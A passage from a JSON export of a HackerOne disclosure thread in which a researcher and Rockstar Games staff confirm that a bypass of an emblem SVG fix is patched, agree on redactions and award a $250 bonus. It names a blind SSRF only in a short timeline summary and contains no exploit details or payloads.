:)","automated_response":false,"created_at":"2017-10-04T18:29:27.479Z","updated_at":"2017-10-16T13:59:50.238Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2063490,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I noticed there's a countdown to public disclosure on this, just checking in to make sure you're aware of it and it won't be accidentally disclosed :)","automated_response":false,"created_at":"2017-10-13T08:07:51.041Z","updated_at":"2017-10-13T08:07:51.041Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2063978,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the reminder @alexbirsan ! On that note, another update for this fix should have been pushed out recently. In our QA environment, I found that attempting to reproduce your latest bypass resulted in a warning box, stating that the emblem could not be saved due to tampering. Can you test it again on your end and make sure you're getting that result? Thanks!","automated_response":false,"created_at":"2017-10-13T13:36:32.094Z","updated_at":"2017-10-13T13:36:32.094Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2064112,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm the bypass is fixed. That was quick!","automated_response":false,"created_at":"2017-10-13T14:21:50.273Z","updated_at":"2017-10-13T14:21:50.273Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2069016,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @alexbirsan ! And indeed a RegEx update was needed, among other fixes. I believe we're in a good state to publicly disclose now. Is there anything else on your end that you'd like to be redacted?","automated_response":false,"created_at":"2017-10-16T13:43:09.996Z","updated_at":"2017-10-16T13:43:09.996Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2069044,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes please, the `svgData` from my latest \"raw request\" comment.","automated_response":false,"created_at":"2017-10-16T13:55:37.708Z","updated_at":"2017-10-16T13:55:37.708Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2075422,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@alexbirsan - Looks like that's been redacted, anything else you see before we publicly disclose? ","automated_response":false,"created_at":"2017-10-18T02:12:47.147Z","updated_at":"2017-10-18T02:12:47.147Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2077376,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's all good!\n\nI'd just like to say, I believe an extra bounty would have been appropriate here? I respect your decision not to award one though, I understand there may be other factors involved that I'm not aware of.\n\nThanks!","automated_response":false,"created_at":"2017-10-18T09:43:30.370Z","updated_at":"2017-10-18T09:43:30.370Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2078608,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @alexbirsan , that seems reasonable. We will award an additional bonus as thanks for finding the bypass and helping us plug it.","automated_response":false,"created_at":"2017-10-18T14:52:11.001Z","updated_at":"2017-10-18T14:52:11.001Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2078610,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-10-18T14:52:44.713Z","updated_at":"2017-10-18T14:52:44.713Z","actor":{"url":"/rockstargames","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Rockstar Games"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"250.0","genius_execution_id":null,"team_handle":"rockstargames","collaborator":{"username":"alexbirsan","url":"/alexbirsan"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2078619,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you very much! This is okay to disclose as far as I'm concerned. ","automated_response":false,"created_at":"2017-10-18T14:56:32.005Z","updated_at":"2017-10-18T14:56:32.005Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2110748,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-10-28T23:44:08.531Z","updated_at":"2017-10-28T23:44:08.531Z","actor":{"url":"/rockstargames","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Rockstar Games"}},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":5457,"category":"researcher","content":"**Aug 31** - Found a blind SSRF\n**Sep 1** - Found a way to escalate - retrieving image files from the server or other places\n**Sep 28** - Problem fixed, $1,250 bounty!\n**Sep 29** - Found a bypass for the fix just before disclosure\n**Oct 13** - Bypass is fixed too\n**Oct 18** - $250 bonus for the bypass! \n\nMost importantly, I got a cool emblem:\n{F224801}","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":76545,"username":"alexbirsan","name":"Alex Birsan","bio":"Full time hacker with a background in software development and bug bounty triage experience. Twitter: @alxbrsn","cleared":true,"website":null,"location":"","created_at":"2016-05-12T15:36:06.209Z","url":"https://hackerone.com/alexbirsan","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}